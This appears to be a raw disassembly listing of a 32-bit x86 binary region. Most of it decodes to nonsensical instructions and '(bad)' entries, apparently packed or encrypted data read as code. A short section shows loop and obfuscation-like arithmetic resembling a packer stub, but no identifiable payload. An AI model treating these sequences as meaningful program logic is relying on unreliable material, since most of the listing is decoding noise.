  421421:	fmul   QWORD PTR [eax+0x29df8846]
  421427:	cvttps2pi mm0,QWORD PTR [eax+eax*1-0x2d]
  42142c:	fcomp  QWORD PTR [esi-0x6]
  42142f:	dec    eax
  421430:	cmp    al,BYTE PTR [ebp+0x7bf2ac04]
  421436:	lea    ecx,[eiz*4+0x32c05d45]
  42143d:	or     DWORD PTR [ecx-0x5ea7423e],esi
  421443:	mov    al,ds:0x18e19ef0
  421448:	sub    eax,0x796ffdbd
  42144d:	aam    0x8a
  42144f:	and    DWORD PTR [edi+ecx*8+0x6c],ebx
  421453:	fcomp  DWORD PTR [edx]
  421455:	psubsb mm3,mm3
  421458:	ins    BYTE PTR es:[edi],dx
  421459:	sub    bl,cl
  42145b:	pop    ecx
  42145c:	imul   edi,DWORD PTR [ebx-0x3322cfdb],0x72
  421463:	outs   dx,BYTE PTR ds:[esi]
  421464:	lods   eax,DWORD PTR ds:[esi]
  421465:	into   
  421466:	fmul   QWORD PTR es:[edi-0x765be1e4]
  42146d:	adc    ch,BYTE PTR [edi-0x7c]
  421470:	cli    
  421471:	xlat   BYTE PTR ds:[ebx]
  421472:	xchg   edx,eax
  421473:	mov    ch,0xf1
  421475:	lods   al,BYTE PTR ds:[esi]
  421476:	mov    dl,0xd8
  421478:	call   0xd442:0xd86eba83
  42147f:	repnz pushf 
  421481:	out    0x4a,eax
  421483:	cmp    cl,al
  421485:	in     eax,dx
  421486:	enter  0x58ca,0xfe
  42148a:	push   es
  42148b:	scas   al,BYTE PTR es:[edi]
  42148c:	adc    DWORD PTR [eax+0x42],edx
  42148f:	nop
  421490:	sbb    ebp,esp
  421492:	and    DWORD PTR [edx+0x7f877787],ecx
  421498:	iret   
  421499:	lods   al,BYTE PTR ds:[esi]
  42149a:	out    dx,al
  42149b:	lods   eax,DWORD PTR ds:[esi]
  42149c:	cmp    ah,BYTE PTR [ebp-0x37849a58]
  4214a2:	jb     0x42150a
  4214a4:	jle    0x421489
  4214a6:	mov    ebp,0x471179eb
  4214ab:	inc    edi
  4214ac:	jmp    0xbfdf:0x1da9b627
  4214b3:	repnz mov eax,ds:0xa481a939
  4214b9:	repnz and ah,dl
  4214bc:	jecxz  0x421500
  4214be:	cwde   
  4214bf:	hlt    
  4214c0:	mov    bl,0x4b
  4214c2:	(bad)  
  4214c3:	cmp    eax,DWORD PTR [edx+0x10]
  4214c6:	ud2    
  4214c8:	test   esp,ebx
  4214ca:	sbb    DWORD PTR [eax],esi
  4214cc:	imul   ebp,DWORD PTR [edx],0xfffffff8
  4214cf:	(bad)  
  4214d0:	fcomp  QWORD PTR [esp+edi*1]
  4214d3:	int    0x54
  4214d5:	sub    eax,0xf8d1fb26
  4214da:	mov    bh,BYTE PTR [esp+0x70]
  4214de:	mov    al,BYTE PTR [ebp-0x79]
  4214e1:	pop    ecx
  4214e2:	aam    0x3
  4214e4:	pop    eax
  4214e5:	pop    ecx
  4214e6:	inc    ebx
  4214e7:	jmp    0x43301ed2
  4214ec:	fwait
  4214ed:	adc    BYTE PTR [esp+esi*2+0x14cb2c66],dl
  4214f4:	sbb    ah,BYTE PTR [ebx+0x4c]
  4214f7:	imul   eax,ebx,0xffffff86
  4214fa:	dec    eax
  4214fb:	dec    ebp
  4214fc:	enter  0x3f08,0xe2
  421500:	xchg   esp,eax
  421501:	repz add al,0xdf
  421504:	sbb    al,0x73
  421506:	fisubr DWORD PTR [ecx+0x64]
  421509:	into   
  42150a:	jne    0x421577
  42150c:	fst    DWORD PTR [esi+0x3d]
  42150f:	pushf  
  421510:	or     al,0x4e
  421512:	sub    DWORD PTR [edi-0x45b1be74],0x48
  421519:	push   ecx
  42151a:	xor    al,0x56
  42151c:	mov    WORD PTR [edx-0x4d7da4e6],fs
  421522:	dec    eax
  421523:	adc    al,0xfa
  421525:	jecxz  0x421545
  421527:	xchg   edx,ebx
  421529:	mov    ah,0x46
  42152b:	inc    ebx
  42152c:	sbb    BYTE PTR [edx+0x67],bh
  42152f:	jno    0x4214f1
  421531:	outs   dx,BYTE PTR ds:[esi]
  421532:	in     al,0x6b
  421534:	retf   
  421535:	(bad)  
  421536:	mov    ecx,0xdb485aef
  42153b:	cld    
  42153c:	push   ecx
  42153d:	push   ebx
  42153e:	loop   0x421555
  421540:	inc    ecx
  421541:	jb     0x4214c7
  421543:	pop    ebp
  421544:	sbb    al,0x6e
  421546:	stc    
  421547:	mov    fs,WORD PTR [ecx]
  421549:	jne    0x42155e
  42154b:	sbb    ebp,DWORD PTR [ebx+esi*1+0x6]
  42154f:	fcom   st(4)
  421551:	test   BYTE PTR [edx+0x474dbf66],al
  421557:	int3   
  421558:	jecxz  0x421552
  42155a:	mov    ebx,0xe5dd1c4a
  42155f:	aam    0xc4
  421561:	aad    0x45
  421563:	dec    eax
  421564:	(bad)  
  421565:	daa    
  421566:	sbb    DWORD PTR [ecx+0x2ac9205b],edx
  42156c:	pop    esi
  42156d:	mov    cl,0x20
  42156f:	(bad)  
  421570:	retf   0x9bb4
  421573:	mov    al,0x68
  421575:	das    
  421576:	hlt    
  421577:	push   ebp
  421578:	xchg   edi,eax
  421579:	fsub   QWORD PTR [eax-0x6352eb29]
  42157f:	pop    ebp
  421580:	mov    ah,0xbf
  421582:	scas   eax,DWORD PTR es:[edi]
  421583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421584:	sahf   
  421585:	mov    bl,0x6c
  421587:	dec    ecx
  421588:	retf   
  421589:	pop    ds
  42158a:	cli    
  42158b:	sbb    cl,BYTE PTR [ebp-0x1cd9591e]
  421591:	lods   al,BYTE PTR ds:[esi]
  421592:	and    eax,0x5da408f1
  421597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421598:	dec    edx
  421599:	call   0xe52:0x2998f590
  4215a0:	inc    ebp
  4215a1:	push   ds
  4215a2:	mov    bl,0xc1
  4215a4:	cwde   
  4215a5:	ins    DWORD PTR es:[edi],dx
  4215a6:	and    dl,BYTE PTR [eax+0x6c]
  4215a9:	out    0xad,eax
  4215ab:	loop   0x4215a3
  4215ad:	inc    ebp
  4215ae:	rcl    DWORD PTR [ebx-0x7cfead4d],0x36
  4215b5:	pop    eax
  4215b6:	(bad)  
  4215b7:	xor    DWORD PTR [edx+0x7b],edx
  4215ba:	push   0x18aa2e3e
  4215bf:	mov    edi,DWORD PTR [edi-0x2b88425a]
  4215c5:	push   ecx
  4215c6:	xor    al,0x71
  4215c8:	les    esi,FWORD PTR [ecx+0x3]
  4215cb:	sbb    esp,eax
  4215cd:	sub    esi,ecx
  4215cf:	sti    
  4215d0:	cmp    esi,0x27
  4215d3:	push   ds
  4215d4:	mov    al,0x86
  4215d6:	or     eax,0xf449c6ce
  4215db:	das    
  4215dc:	inc    esp
  4215dd:	repnz sub DWORD PTR [eax-0x6a],edi
  4215e1:	stos   DWORD PTR es:[edi],eax
  4215e2:	(bad)  
  4215e3:	fsubr  QWORD PTR [esi+esi*2+0x13]
  4215e7:	cmp    al,0x3a
  4215e9:	adc    al,0xe3
  4215eb:	sbb    al,0xc8
  4215ed:	(bad)  
  4215ee:	lds    eax,FWORD PTR [edi+0x74]
  4215f1:	xchg   ebx,eax
  4215f2:	cmp    al,0xb9
  4215f4:	pop    ebx
  4215f5:	scas   al,BYTE PTR es:[edi]
  4215f6:	out    dx,eax
  4215f7:	adc    ecx,edi
  4215f9:	and    BYTE PTR [ecx],al
  4215fb:	sbb    eax,0x6cf12363
  421600:	test   DWORD PTR [edi+edx*4+0xcbe73c5],esi
  421607:	ds ins BYTE PTR es:[edi],dx
  421609:	lea    esp,[eax]
  42160b:	pop    ds
  42160c:	xchg   DWORD PTR [eax-0x50],ebx
  42160f:	rol    DWORD PTR [edi],cl
  421611:	jmp    0x60b2:0xb53bfbfe
  421618:	jge    0x4215d7
  42161a:	arpl   bp,cx
  42161c:	mov    DWORD PTR [esi],edx
  42161e:	add    DWORD PTR [edx+0x4a],eax
  421621:	sub    BYTE PTR [ecx],al
  421623:	inc    edi
  421624:	xor    DWORD PTR gs:[eax+0x7299a92],edx
  42162b:	dec    edx
  42162c:	xlat   BYTE PTR ds:[ebx]
  42162d:	add    BYTE PTR [eax+ebx*2],bl
  421630:	addr16 pop ss
  421632:	cld    
  421633:	mov    eax,ds:0x78e17d83
  421638:	mov    edi,0x868e0e8a
  42163d:	loop   0x421634
  42163f:	and    ah,BYTE PTR [esi-0x5e0fac2c]
  421645:	jecxz  0x421631
  421647:	adc    eax,0xd6a31d5f
  42164c:	cli    
  42164d:	les    eax,FWORD PTR [esi-0xc]
  421650:	das    
  421651:	sbb    eax,0xbaf94f49
  421656:	mov    bh,0xfe
  421658:	fst    QWORD PTR [ecx]
  42165a:	(bad)  
  42165c:	jmp    0x4b5a:0x9d82d7b7
  421663:	stos   DWORD PTR es:[edi],eax
  421664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421665:	push   eax
  421666:	cdq    
  421667:	(bad)  
  421668:	ffree  st(6)
  42166a:	jno    0x4215ec
  42166c:	loop   0x4216b0
  42166e:	xchg   ebx,eax
  42166f:	mov    dl,0xe1
  421671:	mov    eax,ds:0xa606ac53
  421676:	cdq    
  421677:	fstp   DWORD PTR [ecx-0x62f7563d]
  42167d:	icebp  
  42167e:	inc    ecx
  42167f:	pop    edi
  421680:	xchg   edx,eax
  421681:	jo     0x421613
  421683:	sbb    al,0xbe
  421685:	(bad)  
  421686:	pop    ecx
  421687:	push   es
  421688:	aad    0xcb
  42168a:	dec    DWORD PTR [ecx+0x3a1ff72c]
  421690:	sbb    ebp,DWORD PTR [edx-0x4922c88f]
  421696:	xor    eax,0xaab484b9
  42169b:	neg    BYTE PTR [eax]
  42169d:	xchg   esi,eax
  42169e:	lods   al,BYTE PTR ds:[esi]
  42169f:	in     al,dx
  4216a0:	mov    ds:0x94a1fbe8,eax
  4216a5:	mov    WORD PTR [ebx],?
  4216a7:	or     eax,DWORD PTR [esi]
  4216a9:	sahf   
  4216aa:	jmp    0x6d1b:0x38592b2a
  4216b1:	mov    ebp,?
  4216b3:	sub    DWORD PTR [ebx-0x37],esp
  4216b6:	adc    ebx,ecx
  4216b8:	add    DWORD PTR [edi+0x4a1fa19],ebp
  4216be:	xor    esi,ebp
  4216c0:	shl    edi,1
  4216c2:	fcomp  QWORD PTR es:0xecdc64a
  4216c9:	xchg   ebp,eax
  4216ca:	iret   
  4216cb:	loope  0x4216d7
  4216cd:	inc    edi
  4216ce:	mov    ebp,0x51996104
  4216d3:	xor    al,0x6b
  4216d5:	cwde   
  4216d6:	pop    esp
  4216d7:	rcr    edi,cl
  4216d9:	mov    edx,0xa23a0eeb
  4216de:	arpl   WORD PTR [esp+eiz*8],dx
  4216e1:	xor    cl,BYTE PTR [edx]
  4216e3:	int3   
  4216e4:	add    eax,0xd12a62f5
  4216e9:	xchg   esi,eax
  4216ea:	repnz pop ds
  4216ec:	sysexit 
  4216ee:	arpl   WORD PTR [eax-0x18],bp
  4216f1:	push   ecx
  4216f2:	xor    cl,BYTE PTR [ebp+0x62]
  4216f5:	aaa    
  4216f6:	inc    edi
  4216f7:	pop    esi
  4216f8:	icebp  
  4216f9:	stc    
  4216fa:	xchg   BYTE PTR [edi+0x19],al
  4216fd:	fcom   QWORD PTR [esi]
  4216ff:	sbb    al,0xdc
  421701:	push   ebp
  421702:	(bad)  
  421703:	hlt    
  421704:	xor    al,0xea
  421706:	pushf  
  421707:	mov    BYTE PTR [eax+0x7a],0x33
  42170b:	and    dl,bh
  42170d:	xor    eax,ebp
  42170f:	into   
  421710:	mov    bh,0x96
  421712:	inc    esi
  421713:	jge    0x421769
  421715:	or     DWORD PTR [edi-0x48acbef0],edx
  42171b:	loopne 0x4216c3
  42171d:	cwde   
  42171e:	js     0x4216c1
  421720:	inc    edi
  421721:	xor    cl,BYTE PTR [edx+ebp*8]
  421724:	addr16 dec ebx
  421726:	test   DWORD PTR [ebx+0x64],esp
  421729:	leave  
  42172a:	sub    eax,0xdb4633e7
  42172f:	dec    esi
  421730:	cmp    al,0xc4
  421732:	mov    WORD PTR [edx],es
  421734:	call   0x7b9a:0x542829f5
  42173b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42173c:	sti    
  42173d:	cmp    al,0xa0
  42173f:	test   al,0xc
  421741:	add    dh,BYTE PTR [ebp+0x510b8cd2]
  421747:	xchg   ebx,eax
  421748:	adc    eax,0xba7c36af
  42174d:	(bad)  
  42174e:	xor    dl,BYTE PTR [ebx]
  421750:	mov    cl,0x85
  421752:	pop    ebx
  421753:	mov    ecx,0xfc7cc07a
  421758:	ret    0x152a
  42175b:	mov    ch,BYTE PTR [ebx-0x16e0392b]
  421761:	addr16 je 0x4217e0
  421764:	xchg   esi,eax
  421765:	fld    TBYTE PTR [edx]
  421767:	aam    0x7a
  421769:	aaa    
  42176a:	push   0xffffffab
  42176c:	add    al,dl
  42176e:	jl     0x421792
  421770:	add    al,0x4b
  421772:	xor    cl,BYTE PTR [eax+0x2cff67b0]
  421778:	fst    DWORD PTR [ebx]
  42177a:	inc    esp
  42177b:	icebp  
  42177c:	mov    bh,0x76
  42177e:	lea    ebp,[edi+0x5854decf]
  421784:	mov    BYTE PTR [edx],dl
  421786:	cmc    
  421787:	je     0x421776
  421789:	je     0x42170d
  42178b:	xchg   ecx,eax
  42178c:	(bad)  
  42178d:	and    BYTE PTR [eax+0x0],cl
  421790:	push   es
  421791:	xor    esi,esp
  421793:	sbb    DWORD PTR [ebx-0x21e3ea76],ebx
  421799:	jno    0x4217cd
  42179b:	mov    dh,BYTE PTR [esi]
  42179d:	push   edi
  42179e:	sti    
  42179f:	sub    dl,dh
  4217a1:	lods   al,BYTE PTR ds:[esi]
  4217a2:	jne    0x421771
  4217a4:	gs push eax
  4217a6:	dec    eax
  4217a7:	stos   DWORD PTR es:[edi],eax
  4217a8:	push   esp
  4217a9:	mov    ebx,0x510b0f81
  4217ae:	test   al,0xd5
  4217b0:	xor    eax,0x63e867bc
  4217b5:	mov    ds:0xe7982bbf,al
  4217ba:	(bad)  
  4217bb:	jbe    0x42176f
  4217bd:	xor    al,BYTE PTR [edx+ebp*4-0x4fc6f993]
  4217c4:	mov    bh,0xca
  4217c6:	adc    dh,BYTE PTR [ecx+0x65]
  4217c9:	xchg   edi,eax
  4217ca:	sub    DWORD PTR [edi-0x70],ebx
  4217cd:	sbb    esp,DWORD PTR [edi]
  4217cf:	xchg   ebp,eax
  4217d0:	adc    eax,0x1d46c4e9
  4217d5:	mul    DWORD PTR [ebp+eiz*1-0x54]
  4217d9:	cld    
  4217da:	das    
  4217db:	add    cl,BYTE PTR ds:0x7db6d7bf
  4217e1:	repz test dh,bl
  4217e4:	xor    al,0x4
  4217e6:	xor    eax,esi
  4217e8:	push   cs
  4217e9:	cmp    ebp,DWORD PTR [esi+0x42b3cf73]
  4217ef:	jae    0x42179d
  4217f1:	sub    ebx,0x3e258156
  4217f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217f8:	inc    edx
  4217f9:	add    BYTE PTR [eax],al
  4217fb:	add    BYTE PTR [eax],al
  4217fd:	add    cl,ch
  4217ff:	sldt   WORD PTR [eax]
  421802:	add    BYTE PTR [ebx],dh
  421804:	rol    BYTE PTR [ebx],cl
  421806:	adc    eax,0x42a43e
  42180b:	inc    edx
  42180c:	mov    DWORD PTR ds:0x42a43e,edx
  421812:	cmp    DWORD PTR ds:0x42a43e,0x16
  421819:	jae    0x421841
  42181f:	cmp    DWORD PTR ds:0x42a43e,0x1a
  421826:	jbe    0x421841
  42182c:	jmp    0x42183c
  421831:	push   0x76b1
  421836:	call   DWORD PTR ds:0x42a516
  42183c:	jmp    0x421803
  421841:	mov    edx,0x75108a8
  421846:	and    esi,DWORD PTR ds:0x42a3fa
  42184c:	xor    ecx,edx
  42184e:	xor    esi,DWORD PTR ds:0x42a426
  421854:	mov    esi,0x3272ef
  421859:	sub    DWORD PTR ds:0x42a436,0x42a3ce
  421863:	push   edi
  421864:	mov    edi,DWORD PTR [ebp+0x10]
  421867:	add    ecx,esi
  421869:	cmp    ecx,edi
  42186b:	je     0x424b87
  421871:	adc    ecx,ecx
  421873:	mov    ecx,DWORD PTR [ebp-0x4]
  421876:	mov    edi,DWORD PTR ds:0x42a3aa
  42187c:	adc    DWORD PTR ds:0x42a3f2,edi
  421882:	mov    edi,DWORD PTR [ebp+0x10]
  421885:	xor    eax,eax
  421887:	xor    ecx,edx
  421889:	or     DWORD PTR ds:0x42a3be,0x42a3ea
  421893:	add    ecx,esi
  421895:	adc    DWORD PTR ds:0x42a406,0x263a
  42189f:	add    edi,0xfabdbeda
  4218a5:	mov    DWORD PTR ds:0x42a436,0x52b8
  4218af:	adc    eax,0xffffffff
  4218b2:	adc    DWORD PTR ds:0x42a446,0x42a40a
  4218bc:	xor    eax,0x0
  4218bf:	mov    DWORD PTR ds:0x42a41a,0x5a1b
  4218c9:	mov    DWORD PTR [ebp-0xc],eax
  4218cc:	push   ebx
  4218cd:	adc    eax,0x7347
  4218d2:	xor    ebx,ebx
  4218d4:	xor    edi,0x8a29a13b
  4218da:	add    eax,DWORD PTR ds:0x42a43e
  4218e0:	mov    eax,ecx
  4218e2:	add    eax,0xfabdbeda
  4218e7:	mov    DWORD PTR ds:0x42a3de,0x60e7
  4218f1:	adc    ebx,0xffffffff
  4218f4:	sub    DWORD PTR ds:0x42a402,0x42a3be
  4218fe:	xor    eax,0x8a29a13b
  421903:	xor    ebx,0x0
  421906:	cmp    eax,edi
  421908:	mov    DWORD PTR ds:0x42a3da,0x406a
  421912:	jne    0x423cae
  421918:	cmp    ebx,DWORD PTR [ebp-0xc]
  42191b:	jmp    0x423c98
  421920:	xor    cl,BYTE PTR [eax-0x43fc43e]
  421926:	stos   DWORD PTR es:[edi],eax
  421927:	sub    eax,0xffffffcd
  42192a:	(bad)  
  42192b:	cmc    
  42192c:	inc    esi
  42192d:	jmp    0x421984
  42192f:	clc    
  421930:	dec    esi
  421931:	mov    ch,0x79
  421933:	jp     0x42194f
  421935:	pop    edi
  421936:	jp     0x4219b2
  421938:	cld    
  421939:	test   BYTE PTR [eax+0x342fb6f2],cl
  42193f:	xchg   esp,eax
  421940:	not    BYTE PTR [edx+0x1fc6c7f6]
  421946:	(bad)  [esi-0x33]
  421949:	fninit 
  42194b:	bound  edi,QWORD PTR [ebx]
  42194d:	sub    eax,0x2adf49c7
  421952:	addr16 jmp 0x24d3:0x29bdbe7e
  42195a:	jge    0x4219c6
  42195c:	popa   
  42195d:	or     dl,BYTE PTR [ebx+0x18]
  421960:	cmp    esp,DWORD PTR [edx+eax*1-0xf6f182b]
  421967:	fadd   QWORD PTR [ebp+ebx*4-0x5cde0c93]
  42196e:	dec    ecx
  42196f:	xchg   esp,eax
  421970:	and    edi,DWORD PTR [ebx+0x7d5835b1]
  421976:	sar    DWORD PTR [ecx+0x27d02125],0xc1
  42197d:	jbe    0x421950
  42197f:	clc    
  421980:	dec    edi
  421981:	loop   0x42199d
  421983:	jge    0x4219d2
  421985:	add    BYTE PTR [ecx+0x70],ah
  421988:	xchg   ecx,eax
  421989:	loope  0x4219f5
  42198b:	lock ds jnp 0x42192c
  42198f:	je     0x4219a2
  421991:	mov    al,BYTE PTR [ebp+eiz*1-0xe]
  421995:	stos   BYTE PTR es:[edi],al
  421996:	cmp    edx,edx
  421998:	jp     0x421998
  42199a:	shl    BYTE PTR [edx],1
  42199c:	jmp    0x2f104501
  4219a1:	mov    ds:0xcb4f1b29,al
  4219a6:	shl    DWORD PTR [edx-0x2e],1
  4219a9:	xor    esi,edx
  4219ab:	cmp    DWORD PTR [edx-0x794fd584],esi
  4219b1:	dec    edi
  4219b2:	into   
  4219b3:	jno    0x4219f3
  4219b5:	jecxz  0x4219e3
  4219b7:	ret    0x91a
  4219ba:	lds    ebx,FWORD PTR [esi-0x43ca008b]
  4219c0:	and    BYTE PTR [eax+eiz*4],al
  4219c3:	data16 aam 0xde
  4219c6:	jae    0x4219bf
  4219c8:	imul   edx,edx,0xa36bda61
  4219ce:	arpl   cx,dx
  4219d0:	aam    0x36
  4219d2:	mov    esi,0x785a81e6
  4219d7:	loop   0x421a45
  4219d9:	dec    esp
  4219da:	test   DWORD PTR [eax],edi
  4219dc:	add    esp,DWORD PTR [ecx+0x14bc2e18]
  4219e2:	push   es
  4219e3:	rcl    BYTE PTR [edi],cl
  4219e5:	pop    ebx
  4219e6:	push   esi
  4219e7:	push   edi
  4219e8:	arpl   bp,bp
  4219ea:	sub    eax,0x6877e2e6
  4219ef:	xchg   edi,eax
  4219f0:	idiv   BYTE PTR [edx-0x24804163]
  4219f6:	or     DWORD PTR gs:[edi+0x48f293e4],esi
  4219fd:	fld    QWORD PTR [ebx+0x2a]
  421a00:	push   ecx
  421a01:	popa   
  421a02:	dec    esp
  421a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a04:	repz push ss
  421a06:	inc    ebx
  421a07:	mov    ecx,0x7d3905aa
  421a0c:	out    dx,al
  421a0d:	es pop ebp
  421a0f:	mov    ebp,edi
  421a11:	mov    ?,WORD PTR [ecx+0xa]
  421a14:	mov    DWORD PTR [ebx+0x2cc96229],esp
  421a1a:	push   0x62560bb6
  421a1f:	adc    ch,BYTE PTR [ecx+0x7c9e131c]
  421a25:	ss jmp 0x1293:0x24103f19
  421a2d:	(bad)  
  421a2e:	push   ecx
  421a2f:	and    DWORD PTR [eax+0x3d],ebx
  421a32:	pop    ecx
  421a33:	cs fwait
  421a35:	mov    ah,0xba
  421a37:	mov    dl,0xce
  421a39:	fld    QWORD PTR [edx+0x658166c]
  421a3f:	add    bh,BYTE PTR [esi]
  421a41:	mov    esp,0xd6f4f1f9
  421a46:	jne    0x4219ee
  421a48:	mov    esi,0xa8544d43
  421a4d:	adc    BYTE PTR [ebx],bl
  421a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a50:	cmp    al,0x73
  421a52:	dec    esp
  421a53:	cli    
  421a54:	xor    eax,0x4541e692
  421a59:	fcomp  QWORD PTR [eax+esi*2]
  421a5c:	cmp    dl,BYTE PTR [edx]
  421a5e:	scas   eax,DWORD PTR es:[edi]
  421a5f:	and    DWORD PTR [edx-0x720d5a17],ebp
  421a65:	sub    al,0xff
  421a67:	mov    cl,0x2f
  421a69:	xor    bl,BYTE PTR [edx+0x5a210ee7]
  421a6f:	scas   al,BYTE PTR es:[edi]
  421a70:	cmp    eax,0xfa77d62d
  421a75:	outs   dx,DWORD PTR ds:[esi]
  421a76:	jg     0x421ab6
  421a78:	xlat   BYTE PTR ds:[ebx]
  421a79:	sbb    DWORD PTR [ebp-0x6b4f8e3b],ebx
  421a7f:	aaa    
  421a80:	xchg   ebx,eax
  421a81:	dec    edx
  421a82:	dec    ecx
  421a83:	ror    DWORD PTR [eax+0x1a],0xee
  421a87:	cmc    
  421a88:	out    dx,al
  421a89:	sbb    al,0x87
  421a8b:	xchg   ebp,eax
  421a8c:	leave  
  421a8d:	cmp    dl,BYTE PTR [esi+ecx*2-0x1b94348e]
  421a94:	aam    0x68
  421a96:	jno    0x421aa9
  421a98:	pushf  
  421a99:	lahf   
  421a9a:	sbb    bl,al
  421a9c:	aas    
  421a9d:	xor    BYTE PTR [eax],al
  421a9f:	dec    ebp
  421aa0:	pop    edi
  421aa1:	imul   edx,esp,0xffffffec
  421aa4:	fisub  DWORD PTR [ebp+0x3f9fedeb]
  421aaa:	jl     0x421a6c
  421aac:	jo     0x421aec
  421aae:	xchg   edx,eax
  421aaf:	xor    BYTE PTR [edi],bh
  421ab1:	mov    ds:0x861a78bd,eax
  421ab6:	repz sbb BYTE PTR [ebx],0x9
  421aba:	mov    al,dl
  421abc:	hlt    
  421abd:	inc    edi
  421abe:	adc    bl,BYTE PTR [esi-0x59]
  421ac1:	cld    
  421ac2:	out    0xf8,al
  421ac4:	popa   
  421ac5:	inc    esi
  421ac6:	addr16 fcomip st,st(6)
  421ac9:	sub    edi,DWORD PTR [ebx+edi*1]
  421acc:	xchg   ebx,ebx
  421ace:	mov    edx,0x7e0977d3
  421ad3:	retf   0xea0c
  421ad6:	repnz add ebx,DWORD PTR [ebp+0x71]
  421ada:	jecxz  0x421a68
  421adc:	loop   0x421a81
  421ade:	jo     0x421aec
  421ae0:	out    dx,eax
  421ae1:	lea    ecx,[edx+0x72]
  421ae4:	sbb    bh,BYTE PTR [esi+0x6d]
  421ae7:	nop
  421ae8:	frstor [esi+ebx*4]
  421aeb:	fadd   st(7),st
  421aed:	(bad)  
  421aee:	xchg   ebp,eax
  421aef:	neg    DWORD PTR ds:0xdb35d0f2
  421af5:	out    0xcf,al
  421af7:	repnz mov DWORD PTR [edx+0x568f11f4],esp
  421afe:	fst    DWORD PTR [esp+ebx*1+0x4e]
  421b02:	adc    BYTE PTR [eax-0x43d45b4b],cl
  421b08:	adc    DWORD PTR [edi],0xffffffe4
  421b0b:	es sahf 
  421b0d:	cmp    bl,BYTE PTR [esi+edx*4-0x50]
  421b11:	inc    ecx
  421b12:	adc    al,0x5f
  421b14:	lahf   
  421b15:	mov    eax,0xc3ecc01f
  421b1a:	xor    BYTE PTR [ebp-0x226849d0],dh
  421b20:	adc    eax,eax
  421b22:	jg     0x421b24
  421b24:	jle    0x421b95
  421b26:	mov    ebx,DWORD PTR [eax]
  421b28:	imul   eax,DWORD PTR [ecx-0x4a6502b6],0x63f11d2e
  421b32:	mov    ah,0xc0
  421b34:	ins    BYTE PTR es:[edi],dx
  421b35:	adc    eax,DWORD PTR cs:[esi+0x31]
  421b39:	dec    eax
  421b3a:	xor    ah,0x1c
  421b3d:	mov    esp,0x210f2d6a
  421b42:	push   cs
  421b43:	adc    eax,0xc7568c23
  421b48:	cmp    eax,0x951a7ab6
  421b4d:	ret    
  421b4e:	and    esp,DWORD PTR [ecx-0x59]
  421b51:	push   cs
  421b52:	lds    edx,FWORD PTR ds:0x615559c9
  421b58:	jmp    0x483d2971
  421b5d:	in     eax,0x23
  421b5f:	and    eax,0x7eb90e72
  421b64:	mov    ds:0x633bd93,eax
  421b69:	sbb    al,0xba
  421b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b6c:	aad    0xe2
  421b6e:	jp     0x421b50
  421b70:	lock cmp al,0x87
  421b73:	pop    esi
  421b74:	stc    
  421b75:	inc    eax
  421b76:	mov    es,esi
  421b78:	jp     0x421b7f
  421b7a:	dec    esi
  421b7b:	add    BYTE PTR [edx+0x45],dh
  421b7e:	fwait
  421b7f:	aam    0x19
  421b81:	sub    al,BYTE PTR [esi-0x60]
  421b84:	ss addr16 into 
  421b87:	test   DWORD PTR [eax-0x24227307],edi
  421b8d:	xor    bl,BYTE PTR [edi]
  421b8f:	sbb    BYTE PTR [ebp+0x68],dh
  421b92:	and    eax,0x1e14ae98
  421b97:	mov    bh,BYTE PTR [esi-0x12]
  421b9a:	cdq    
  421b9b:	add    bh,dh
  421b9d:	pop    ebx
  421b9e:	enter  0x7f81,0x8b
  421ba2:	ja     0x421bd7
  421ba4:	mov    dh,0xdd
  421ba6:	out    dx,al
  421ba7:	shr    ebx,1
  421ba9:	sbb    al,0x65
  421bab:	fwait
  421bac:	mov    al,ds:0x41b5e31a
  421bb1:	mov    eax,0x41558c89
  421bb6:	ret    
  421bb7:	fstp   DWORD PTR [ecx+ebx*4+0x64]
  421bbb:	loop   0x421bc1
  421bbd:	pop    esi
  421bbe:	push   ds
  421bbf:	retf   
  421bc0:	dec    esp
  421bc1:	dec    ebp
  421bc2:	cmp    BYTE PTR [eax],dh
  421bc4:	lods   al,BYTE PTR ds:[esi]
  421bc5:	ins    DWORD PTR es:[edi],dx
  421bc6:	ins    DWORD PTR es:[edi],dx
  421bc7:	cs xchg ecx,eax
  421bc9:	sbb    al,0x9f
  421bcb:	xor    dh,bl
  421bcd:	mov    al,ds:0xaaa3873
  421bd2:	pop    ss
  421bd3:	rcl    cl,0xfd
  421bd6:	adc    BYTE PTR [edi],cl
  421bd8:	(bad)  
  421bd9:	retf   0xe226
  421bdc:	mov    ebp,0xbbd003c4
  421be1:	sti    
  421be2:	mov    cl,0xb1
  421be4:	dec    ecx
  421be5:	push   cs
  421be6:	in     eax,0x9c
  421be8:	pop    edi
  421be9:	sti    
  421bea:	jne    0x421c53
  421bec:	pop    ebx
  421bed:	fadd   st,st(2)
  421bef:	sbb    eax,0xd35c9ce
  421bf4:	std    
  421bf5:	stos   BYTE PTR es:[edi],al
  421bf6:	(bad)  
  421bf7:	pusha  
  421bf8:	cwde   
  421bf9:	dec    eax
  421bfa:	cs sub al,0xb5
  421bfd:	enter  0x59fa,0x18
  421c01:	pop    ebp
  421c02:	call   ebx
  421c04:	cdq    
  421c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c06:	and    eax,0x4daa3170
  421c0b:	pushf  
  421c0c:	pushw  es
  421c0e:	nop
  421c0f:	aaa    
  421c10:	sub    eax,0xd244ad58
  421c15:	jle    0x421c09
  421c17:	adc    eax,0x62c0e4ae
  421c1c:	mov    ax,0x5c31
  421c20:	ret    0x77f2
  421c23:	xchg   DWORD PTR [edx-0x5c03c417],ebx
  421c29:	cmp    ecx,DWORD PTR [edx+eiz*2]
  421c2c:	cmp    dh,dl
  421c2e:	pop    edi
  421c2f:	and    eax,0x9110f1ad
  421c34:	js     0x421bcf
  421c36:	xor    DWORD PTR [esi+ebx*1],esp
  421c39:	cmc    
  421c3a:	adc    eax,0xe0fa7ee7
  421c3f:	iret   
  421c40:	mov    bh,0x40
  421c42:	nop
  421c43:	sbb    DWORD PTR [ebp-0x24],edi
  421c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c47:	pop    ds
